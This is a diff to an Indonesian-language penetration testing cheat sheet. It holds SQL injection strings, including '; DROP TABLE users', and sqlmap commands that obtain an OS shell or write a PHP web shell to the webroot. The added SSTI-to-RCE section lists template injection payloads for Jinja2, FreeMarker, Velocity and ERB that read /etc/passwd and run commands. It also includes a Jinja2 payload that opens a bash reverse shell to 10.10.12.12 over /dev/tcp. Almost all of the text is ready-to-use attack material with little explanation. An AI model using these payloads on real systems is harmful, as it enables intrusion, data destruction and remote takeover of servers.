@@ -71,7 +71,6 @@ PgSQL ✓ '; DROP TABLE users-- -
 Oracle ~ terbatas — blok PL/SQL anonim
 MySQL ✗ driver PHP (mysqli/PDO) menolak
 
-
 admin'-- -
 ' OR '1'='1'-- -
 sqlmap -u "http://target/page.php?id=1" --os-shell
@@ -81,6 +80,34 @@ sqlmap -u "http://target/?id=1" --file-write="/local/path/shell.php" --file-dest
 sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\MYUSER-FU\Downloads\shell.php" --file-dest="/var/www/html/shell.php"
 
 Syarat: FILE privilege & path webroot absolut diketahui (mis. /var/www/html).
+```
+
+SSTI to RCE
+```bash
+Engine menggabungkan template statis dengan data dinamis untuk menghasilkan HTML. Selama input pengguna diperlakukan sebagai data , bukan bagian dari template, semuanya aman. XSS dieksekusi di browser korban, sedangkan SSTI dieksekusi di server.
+
+* Contoh
+hello.html — template (Jinja2)
+
+<h1>Hello, {{ name }}</h1>
+# name = "Andi" (data, aman)
+<h1>Hello, Andi</h1>
+
+* Payload
+{{ 7 * 7 }}
+${ 7 * 7 }
+<%= 7*7 %>
+{{7*'7'}}
+{{ lipsum.__globals__.os.popen('cat /etc/passwd' ).read()}}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ ['id']|filter('system') }}
+<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}
+#set($e=$x.getClass().forName('java.lang.Runtime')...) .exec('id')
+<%= system('id') %>
+<%= system(`id`) %>
+
+{{lipsum.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.10.12.12/43795 0>&1'").read()}}
+
 ```
 
 Reverse Shell dari Pentest Monkey 
